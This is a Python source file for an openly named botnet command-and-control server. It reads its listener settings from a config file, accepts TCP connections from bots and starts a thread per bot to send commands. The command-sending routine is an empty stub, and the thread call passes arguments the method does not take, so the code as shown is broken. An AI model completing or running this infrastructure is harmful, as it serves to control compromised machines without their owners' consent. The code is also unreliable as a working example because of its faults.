import os
import asyncio
import uuid
from pathlib import Path
import time
import threading
import configparser
from logger import CoreLogger
from socket import socket, AF_INET, SOCK_STREAM


def load_conf():
    config_parser = configparser.ConfigParser()
    cwd_path = Path(__file__)
    root_dir = cwd_path.parent.absolute()
    try:
        config_path = os.path.join(root_dir, "cfg/commander.ini")
        config_parser.read(config_path)
        host = config_parser.get("CORE", "HOST")
        port = int(config_parser.get("CORE", "PORT"))
        log_level = int(config_parser.get("CORE", "LOG_LEVEL"))
        log_dir = config_parser.get("CORE", "LOG_DIR")
        log_name = config_parser.get("CORE", "LOG_NAME")
        conn_buff = int(config_parser.get("CORE", "CONN_BUFF"))
    except Exception as err:
        print("Error initializing CORE, Commander not started because config file could not be loaded. Unexpected "
              "exception occurred: {}".format(err))
        exit(5)
    return host, port, log_level, log_dir, log_name, conn_buff


class BotCommander:
    def __init__(self, host, port, conn_rcv):
        self.uuids = {}
        self.host = host
        self.port = port
        self.conn_rcv = conn_rcv
        self.sock = socket(AF_INET, SOCK_STREAM)
        logger.core.info("Server initialized")
        self.__listen_for_bots()

    def __listen_for_bots(self):
        try:
            self.sock.bind((self.host, self.port))
            self.sock.listen()
        except Exception as err:
            logger.core.error(f"Unexpected error occurred when starting listener on {self.host}:{self.port} - {err}")
            exit(1)
        logger.core.info(f"Started listener on {self.host}:{self.port}")
        while True:
            conn, addr = self.sock.accept()
            logger.core.info(f"New connection established with {addr}")
            threading.Thread(target=self.__send_instructions, args=(conn, addr)).start()

    def __send_instructions(self):
        pass

    @staticmethod
    def __build_payload(operation):
        d = {"command": operation}
        return str(d).encode("utf-8")


if __name__ == "__main__":
    HOST, PORT, LOG_LEVEL, LOG_DIR, LOG_NAME, CONN_BUFF = load_conf()
    logger = CoreLogger(LOG_LEVEL, LOG_DIR, LOG_NAME)
    srv = BotCommander(HOST, PORT, CONN_BUFF)
    logger.core.info("Botnet-Commander exited")
